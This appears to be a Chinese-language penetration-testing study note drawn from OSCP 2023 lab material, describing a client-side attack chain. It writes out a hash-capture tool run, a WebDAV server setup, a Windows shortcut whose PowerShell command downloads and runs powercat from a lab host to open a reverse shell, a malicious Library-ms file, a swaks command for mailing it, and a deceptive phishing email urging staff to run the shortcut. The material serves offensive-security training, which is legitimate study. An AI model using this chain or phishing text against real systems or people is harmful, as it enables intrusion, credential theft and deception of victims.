>[!重點] 
>本章內容來自於OSCP 2023教材 
# hashgrab.py
>[!warning]
>抓取人員點擊的小工具

[吉哈伯連結](https://raw.githubusercontent.com/dharanivarma/Pentesting-Tools/main/hashgrab.py)
```title:hashgrab.py
python /opt/hashgrab/hashgrab.py 192.168.45.207 test
```
``` title:output
┌──(kali㉿kali)-[~/Desktop/PG_PRATICE/nara]
└─$ sudo python /opt/hashgrab/hashgrab.py 192.168.45.207 test
[*] Generating hash grabbing files..
[*] Written @test.scf
[*] Written @test.url
[*] Written test.library-ms
[*] Written desktop.ini
[*] Written lnk_778.ico
[+] Done, upload files to smb share and capture hashes with smbserver.py/responder
```
# wsgidav
>[!warning ] 小節重點
>wsgidav是用來傳輸shortcut過去的，裡面要放一個shortcut
## 安裝
```
pip3 install wsgidav
```
- wsgidav 
``` shell
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
```
- shortcuts 
>直接用windows的shortcut，裡面可以放下列指令
``` shell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```
- config.Library-ms
>這個東西要想辦法寄給受害方，受害方點擊就可以連˙進去wsgidav
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
- swaks 
>用於寄送信件
```
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```
- body 
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```
